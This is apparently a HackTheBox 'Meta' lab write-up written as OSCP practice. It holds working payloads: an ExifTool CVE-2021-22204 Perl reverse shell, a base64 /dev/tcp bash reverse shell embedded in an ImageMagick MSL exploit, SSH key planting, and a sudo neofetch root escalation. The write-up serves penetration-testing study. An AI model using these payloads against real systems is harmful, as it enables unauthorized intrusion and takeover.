---
layout: post
title: "meta"
date: 2025-10-06 
categories: OSCP Playlist
---
# meta

# Summary

- fuzz to find subdomain
- find image upload functionality; saw exiftool output
- found exiftool RCE to get reverse shell as www-data
- pspy to find cron jobs running mogrify
- found mogrify version vulnerable to command injection; get reverse shell as user thomas
- sudo privilege to use neofetch; injected shell code in config file; env_keep defined in sudo privileges to keep malicious configuration file; execute /bin/sh as root

# Attack Path

First enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/meta 10.10.11.140

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)
|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)
|_  256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)
80/tcp open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Did not follow redirect to http://artcorp.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We get the domain name. Let’s add that to our /etc/hosts file:

```bash
10.10.11.140 artcorp.htb
```

![image.png]({{ site.baseurl }}/assets/meta/image.png)

Nothing interesting in the source code. Let’s fuzz the site for subdomains:

```bash
ffuf -u http://10.10.11.140 -H "Host: FUZZ.artcorp.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 0

dev01                   [Status: 200, Size: 247, Words: 16, Lines: 10, Duration: 22ms]

```

Let’s add that subdomain to our /etc/hosts file and visit the site.

![image.png]({{ site.baseurl }}/assets/meta/image%201.png)

Nothing interesting in the source code. Let’s click on the hyperlink.

![image.png]({{ site.baseurl }}/assets/meta/image%202.png)

File upload site. 

Let’s upload a normal image file and see what happens:

![image.png]({{ site.baseurl }}/assets/meta/image%203.png)

The metadata are also displayed. This looks like the output of exiftool. Let’s use that against our image file and compare the output:

```bash
exiftool test.png

ExifTool Version Number         : 13.25
File Name                       : test.png
Directory                       : .
File Size                       : 225 kB
File Modification Date/Time     : 2025:10:06 10:31:11-04:00
File Access Date/Time           : 2025:10:06 10:31:19-04:00
File Inode Change Date/Time     : 2025:10:06 10:31:11-04:00
File Permissions                : -rw-rw-r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 800
Image Height                    : 600
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Image Size                      : 800x600
Megapixels                      : 0.480

```

Looks very similar, with some fields missing out. 

Let’s search up exiftool exploit. We find this one that allows arbitrary code execution and a function for a reverse shell. https://github.com/UNICORDev/exploit-CVE-2021-22204. It exploits the Improper neutralization of user data in the DjVu file format in ExifTool. Let’s try it out:

```bash
git clone https://github.com/UNICORDev/exploit-CVE-2021-22204.git
```

Now let’s execute and generate an image file:

```bash
python3 exploit-CVE-2021-22204.py -s 10.10.16.9 4444
 
 UNICORD: Exploit for CVE-2021-22204 (ExifTool) - Arbitrary Code Execution
PAYLOAD: (metadata "\c${use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(4444,inet_aton('10.10.16.9')))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};};")
DEPENDS: Dependencies for exploit are met!
PREPARE: Payload written to file!
PREPARE: Payload file compressed!
PREPARE: DjVu file created!
PREPARE: JPEG image created/processed!
PREPARE: Exiftool config written to file!
EXPLOIT: Payload injected into image!
CLEANUP: Old file artifacts deleted!
SUCCESS: Exploit image written to "image.jpg"

```

Now let’s upload our image. After uploading, we have shell:

![image.png]({{ site.baseurl }}/assets/meta/image%204.png)

Let’s start default enumeration:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![image.png]({{ site.baseurl }}/assets/meta/image%205.png)

We don’t have the password for www-data user. 

There are only two subdomains:

![image.png]({{ site.baseurl }}/assets/meta/image%206.png)

Only two ports opened:

```bash
ss -lntp

State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    
LISTEN    0         128                0.0.0.0:80               0.0.0.0:*       
LISTEN    0         128                0.0.0.0:22               0.0.0.0:*       
LISTEN    0         128                   [::]:22                  [::]:* 
```

Let’s upload linpeas and enumerate the host fully:

```bash
╔══════════╣ Sudo version                                              
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version
Sudo version 1.8.27
```

It crashed.

Let’s find files with SUID and GUID bit set:

```bash
find / -perm -4000 -type f -ls 2>/dev/null
find / -perm -2000 -type f -ls 2>/dev/null

#find files belonging to user
find / -user dev_admin 2>/dev/null
```

Nothing interesting. Let’s find files related to www-data:

```bash
find / -user www-data 2>/dev/null
```

Nothing stood out. Let’s run pspy to see what cronjobs are running:

```bash
2025/10/06 11:31:01 CMD: UID=0    PID=5092   | /usr/sbin/CRON -f 
2025/10/06 11:31:01 CMD: UID=0    PID=5091   | /usr/sbin/CRON -f 
2025/10/06 11:31:01 CMD: UID=0    PID=5093   | /usr/sbin/CRON -f 
2025/10/06 11:31:01 CMD: UID=0    PID=5094   | /usr/sbin/CRON -f 
2025/10/06 11:31:01 CMD: UID=0    PID=5095   | /bin/sh -c rm /tmp/* 
2025/10/06 11:31:01 CMD: UID=1000 PID=5096   | /bin/sh -c /usr/local/bin/convert_images.sh 
2025/10/06 11:31:01 CMD: UID=1000 PID=5097   | /bin/bash /usr/local/bin/convert_images.sh 
2025/10/06 11:31:01 CMD: UID=1000 PID=5098   | pkill mogrify 
2025/10/06 11:32:01 CMD: UID=0    PID=5101   | /usr/sbin/CRON -f 
2025/10/06 11:32:01 CMD: UID=0    PID=5100   | /usr/sbin/cron -f 
2025/10/06 11:32:01 CMD: UID=0    PID=5099   | /usr/sbin/CRON -f 
2025/10/06 11:32:01 CMD: UID=1000 PID=5102   | /bin/sh -c /usr/local/bin/convert_images.sh 
2025/10/06 11:32:01 CMD: UID=1000 PID=5103   | /bin/bash /usr/local/bin/convert_images.sh 
2025/10/06 11:32:01 CMD: UID=1000 PID=5104   | /bin/bash /usr/local/bin/convert_images.sh 
2025/10/06 11:32:01 CMD: UID=0    PID=5106   | /bin/sh -c rm /tmp/* 
2025/10/06 11:32:01 CMD: UID=0    PID=5105   | /bin/sh -c rm /tmp/* 
2025/10/06 11:32:01 CMD: UID=0    PID=5107   | /usr/sbin/CRON -f 
2025/10/06 11:32:01 CMD: UID=0    PID=5108   | /bin/sh -c cp -rp ~/conf/config_neofetch.conf /home/thomas/.config/neofetch/config.conf 
2025/10/06 11:32:01 CMD: UID=1000 PID=5109   | /bin/bash /usr/local/bin/convert_images.sh 

```

Let’s see what convert_images.sh is:

```bash
ls -l /usr/local/bin/convert_images.sh
-rwxr-xr-x 1 root root 126 Jan  3  2022 /usr/local/bin/convert_images.sh

#CONTENT:

#!/bin/bash
cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null
pkill mogrify
```

Let’s see what mogrify is:

```bash
ls -l /usr/local/bin/mogrify

lrwxrwxrwx 1 root root 6 Aug 29  2021 /usr/local/bin/mogrify -> magick
```

It is a link file to magick. 

```bash
which magick

/usr/local/bin/magick

ls -l /usr/local/bin/magick
-rwxr-xr-x 1 root root 40048 Aug 29  2021 /usr/local/bin/magick

/usr/local/bin/magick --version

Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org

```

This is execute by user with UID 1000, which we can find out that’s user thomas from /etc/passwd:

```bash
thomas:x:1000:1000:thomas,,,:/home/thomas:/bin/bash
```

Essentially, what this program does is connvert every image in  /var/www/dev01.artcorp.htb/convert_images/ folder to PNG format, ignore any errors.

Searching up mogrify 2020 exploit lead us to this site:

https://nvd.nist.gov/vuln/detail/CVE-2020-29599

Which talks about a command injection vulnerability it has. This is the full writeup site:

https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html

![image.png]({{ site.baseurl }}/assets/meta/image%207.png)

Let’s copy the POC and change the command to get a reverse shell instead;

First create our payload:

```bash
echo -n "bash -i >& /dev/tcp/10.10.16.9/9001 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45LzkwMDEgMD4mMQ==

echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45LzkwMDEgMD4mMQ== | base64 -d | bash
```

So our final exploit is:

```bash
<image authenticate='ff" `echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45LzkwMDEgMD4mMQ== | base64 -d | bash`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```

Let’s save it in the /var/www/dev01.artcorp.htb/convert_images/ dir:

![image.png]({{ site.baseurl }}/assets/meta/image%208.png)

Now we wait.

We now have shell as thomas:

![image.png]({{ site.baseurl }}/assets/meta/image%209.png)

Let’s get a proper shell:

```bash
#Let's create a ssh key on attack host
ssh-keygen -f thomas
cat thomas.pub

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5OmR+EBL02X59Eq2BrpF1vKtyX2ISGLErup+RQ7vHE kali@kali

#Now cat the content and echo it to authorized_keys on target host
cd .ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5OmR+EBL02X59Eq2BrpF1vKtyX2ISGLErup+RQ7vHE kali@kali" >> authorized_keys

#Now we try to login:
chmod 600 thomas #change to secure permission to allow use of private key

ssh -i thomas thomas@10.10.11.140

```

We now have ssh access.

## exploiting env_keep + neofetch

Let’s check our privileges:

```bash
id
uid=1000(thomas) gid=1000(thomas) groups=1000(thomas)

sudo -l

Matching Defaults entries for thomas on meta:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
env_keep+=XDG_CONFIG_HOME

User thomas may run the following commands on meta:
(root) NOPASSWD: /usr/bin/neofetch \"\"

```

This means we can use neofetch, but cannot pass any arguments

We go on GTFObin and find neofetch. 

```bash
TF=$(mktemp)
echo 'exec /bin/sh' >$TF
sudo /usr/bin/neofetch --config $TF
```

`XDG_CONFIG_HOME` is part of the **XDG Base Directory Specification**, which defines where user-specific configuration files should live in Linux/Unix environments.

- By default, it points to:
    
    ```
    $HOME/.config
    
    ```
    

So for Neofetch, our config file is typically the following when executed with sudo:

```
/root/.config/neofetch/config.conf

```

However, if we set:

```bash
export XDG_CONFIG_HOME=/home/thomas/.config
```

then Neofetch will look in:

```
/home/thomas/.config/neofetch/config.conf

```

instead of `~/.config/neofetch/config.conf`.

Let’s change the config.conf to a shell and export XDG_CONFIG_HOME to our current home dir:

```bash
echo 'exec /bin/sh' > /home/thomas/.config/neofetch/config.conf

#verify
cat /home/thomas/.config/neofetch/config.conf

#now export
export XDG_CONFIG_HOME=/home/thomas/.config
```

Now let’s execute neofetch as sudo:

```bash
sudo /usr/bin/neofetch 
```

![image.png]({{ site.baseurl }}/assets/meta/image%2010.png)

We are now root.